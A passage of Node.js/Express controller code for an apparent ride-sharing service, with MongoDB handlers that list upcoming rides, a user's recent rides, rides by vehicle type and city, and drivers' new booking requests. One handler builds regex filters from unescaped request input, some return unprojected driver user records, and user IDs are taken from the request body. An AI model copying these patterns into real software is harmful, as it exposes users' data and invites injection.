    let finalRides = [...cityRides];

    if (finalRides.length < 6) {
      const remaining = 6 - finalRides.length;
      const excludeIds = finalRides.map((r) => r._id);

      const random = await rideModel.aggregate([
        {
          $match: {
            isDeleted: false,
            availableSeats: { $gt: 0 },
            _id: { $nin: excludeIds },
          },
        },

        {
          $addFields: {
            rideDateTime: {
              $toDate: "$departureTime", // ✅ FIXED
            },
          },
        },

        {
          $match: {
            rideDateTime: { $gte: now },
          },
        },

        { $sample: { size: remaining } },

        {
          $lookup: {
            from: "users",
            localField: "driver",
            foreignField: "_id",
            as: "driver",
          },
        },
        { $unwind: "$driver" },

        {
          $lookup: {
            from: "cars",
            localField: "car",
            foreignField: "_id",
            as: "car",
          },
        },
        { $unwind: "$car" },
      ]);

      finalRides = [...finalRides, ...random];
    }

    return res.status(200).json({
      success: true,
      error: false,
      now,
      cityRequested: city || null,
      cityMatched: cityRides.length,
      randomAdded: finalRides.length - cityRides.length,
      count: finalRides.length,
      data: finalRides,
    });
  } catch (error) {
    next(error);
  }
};

export const handleGetRecentRideByUserId = async (req, res, next) => {
  try {
    const { userId } = req.body;

    if (!userId) {
      return res.status(400).json({
        success: false,
        error: true,
        message: "User Id required",
      });
    }

    const rides = await rideModel.aggregate([
      {
        $match: {
          isDeleted: false,
          $or: [
            { driver: new mongoose.Types.ObjectId(userId) },
            { "passengers.user": new mongoose.Types.ObjectId(userId) },
          ],
        },
      },

      {
        $addFields: {
          rideDateTime: {
            $toDate: "$departureTime",
          },
        },
      },

      // Latest rides first
      { $sort: { rideDateTime: -1 } },

      // Only 5 rides
      { $limit: 5 },

      // DRIVER POPULATE
      {
        $lookup: {
          from: "users",
          localField: "driver",
          foreignField: "_id",
          as: "driver",
        },
      },
      { $unwind: "$driver" },

      // CAR POPULATE
      {
        $lookup: {
          from: "cars",
          localField: "car",
          foreignField: "_id",
          as: "car",
        },
      },
      { $unwind: "$car" },
    ]);

    return res.status(200).json({
      success: true,
      error: false,
      count: rides.length,
      data: rides,
    });
  } catch (error) {
    next(error);
  }
};

export const GetAllUpcomingRideByVehicalType = async (req, res, next) => {
  try {
    const { vehicleType, city } = req.body;

    const now = new Date().toISOString(); // current date & time
    console.log(now, "this is now")

    const rides = await Ride.find({
      "carDetails.vehicleType": { $regex: `^${vehicleType}$`, $options: "i" },
      "from.city": { $regex: `^${city}$`, $options: "i" },
      departureTime: { $gt: now },
      isDeleted: false,
    })
      .populate("driver", "firstName lastName profilePhotos email phone ratings averageRating")
      .populate({
        path: "car",
        populate: {
          path: "owner",
          select: "firstName lastName"
        }
      })
      .populate("passengers.user", "firstName lastName")
      .sort({ departureTime: 1 });

    res.status(200).json({
      success: true,
      totalRides: rides.length,
      rides
    });

  } catch (error) {
    next(error);
  }
};


export const handleGetNewBookingRequests = async (req, res, next) => {
  try {
    const { userId } = req.body;

    if (!validateField(userId, "UserId is required", res)) return;

    const bookings = await rideModel.aggregate([
      {
        $match: {
          driver: new mongoose.Types.ObjectId(userId),
          "passengers.status": "requested"
        }
      },

      // 🔥 filter only requested passengers
      {
        $project: {
          passengers: {
            $filter: {
              input: "$passengers",
              as: "p",
              cond: { $eq: ["$$p.status", "requested"] }
            }
          },
          from: 1,
          to: 1,
          departureTime: 1,
          departureDate: 1
        }
      },

      // 🔥 get user details
      {
        $lookup: {
          from: "users",
          let: { userIds: "$passengers.user" },
          pipeline: [
            {
              $match: {
                $expr: { $in: ["$_id", "$$userIds"] }
              }
            },
            {
              $project: {
                firstName: 1,
                lastName: 1,
                phone: 1,
                profilePhotos: 1,
                bio: 1
              }
            }
          ],
          as: "passengerUsers"
        }
      },

      // 🔥 map users into passengers array
      {
        $addFields: {
          passengers: {
            $map: {
              input: "$passengers",
              as: "p",
              in: {
                $mergeObjects: [
                  "$$p",
                  {
                    user: {
                      $arrayElemAt: [
                        {
                          $filter: {
                            input: "$passengerUsers",
                            as: "u",
                            cond: { $eq: ["$$u._id", "$$p.user"] }
                          }
                        },
                        0
                      ]
                    }
                  }
                ]
              }
            }
          }
        }
      },

      // 🔥 remove extra field
      {
        $project: {
          passengerUsers: 0
        }
      }
    ]);

    return res.status(200).json({
      message: bookings.length ? "These are new bookings" : "No bookings found",
      success: true,
      error: false,
      bookings,
      count: bookings.length
    });

  } catch (error) {
    next(error);
  }
};